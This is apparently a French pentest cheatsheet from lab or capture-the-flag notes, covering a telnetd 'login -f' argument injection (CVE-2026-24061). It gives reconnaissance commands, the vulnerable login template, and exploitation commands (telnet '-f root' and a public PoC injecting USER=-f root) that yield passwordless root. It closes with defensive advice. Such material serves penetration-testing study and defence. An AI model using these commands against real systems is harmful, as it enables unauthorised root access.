# Cheatsheet — telnetd `login -f` argument injection (CVE-2026-24061)

Un **telnetd** (GNU inetutils) lancé en root par **inetd** invoque `/usr/bin/login` en y insérant le **nom d'utilisateur fourni par le client comme argument brut**. En injectant un nom qui commence par `-f`, on transforme ça en flag **`login -f <user>`** = « utilisateur déjà authentifié » → **login sans mot de passe**, souvent **root**.

> ⚠️ Labs / périmètres autorisés uniquement (art. 323-1).

---

## 1. Repérage

```bash
ss -tlnp | grep ':23'                 # telnet en écoute (souvent 127.0.0.1)
ps aux | grep -iE 'inetd|telnetd'     # inetutils-inetd + telnetd en root
cat /etc/inetd.conf                   # la ligne du service 23
#   ex: 127.0.0.1:telnet stream tcp nowait root /usr/local/sbin/telnetd telnetd
```
Confirmer le binaire et son invocation de `login` :
```bash
ls -la /usr/local/sbin/telnetd        # -> /usr/libexec/telnetd (GNU inetutils)
strings /usr/libexec/telnetd | grep -i login
#   /usr/bin/login -p -h %h %?u{-f %u}{%U}    <-- %U = nom client injecté brut
```

## 2. Le mécanisme

- `%h` = host, `%U` = nom d'utilisateur fourni par le client (inséré **sans filtrage**), `%u` = nom d'autologin.
- Si on fait en sorte que la commande devienne `login -p -h <host> -f root`, le flag **`-f`** dit à `login` : *« authentification déjà faite, connecte-le »* → **pas de mot de passe**.
- `login` tourne en **root** (lancé par inetd) → on choisit n'importe quel compte, root compris.

## 3. Exploitation

**Piège :** `login` veut `-f` **et** le nom en **deux arguments séparés**. Un seul token `-froot` est **rejeté** (affiche l'usage de `login`). Il faut produire deux tokens.

```bash
# Tentative manuelle (selon le client/version, peut échouer sur le découpage) :
telnet -l '-f root' 127.0.0.1         # espace -> deux tokens
telnet -a -l root   127.0.0.1         # -a = autologin -> template "-f %u"

# Le plus fiable : PoC qui injecte la variable d'env USER via l'option ENVIRON du protocole telnet
#   (le daemon relaie les variables d'env du client à login)
python3 poc.py 127.0.0.1 23           # Ish3ng0m4/CVE-2026-24061-Telnetd -> USER=-f root
id                                    # uid=0(root)
```

> **Pourquoi l'ENVIRON marche mieux** : le protocole telnet permet au client d'envoyer des **variables d'environnement** (RFC 1572). Le daemon les passe à `login`. Mettre `USER=-f root` produit l'injection proprement, sans dépendre du découpage du `-l`.

## 4. Pourquoi ça marche (à l'oral)

Même famille que les **wildcard/argument injections** (7z, tar, rsync) : une **entrée contrôlée par l'attaquant** (ici le nom d'utilisateur / une variable d'env telnet) est passée **comme argument** à un binaire privilégié (`login`), ce qui en **change le comportement** (devient le flag `-f`). Le binaire fait ce pour quoi il est conçu — c'est la **confiance accordée à une entrée externe** qui est en faute.

## 5. Côté défense

- Ne pas exposer telnetd, même en localhost ; préférer SSH. Désactiver rsh/rlogin/telnet (services legacy).
- Si inetd requis : ne pas lancer `login` avec un nom client non filtré ; patcher inetutils (CVE-2026-24061).
- Surveiller un service en écoute sur **:23** et les process `login -f` inattendus.

## Fiches liées
- [linux-privesc](linux-privesc.md) · [commandes-utiles](commandes-utiles.md) · Machine : [Orion](../machines/Orion.md)
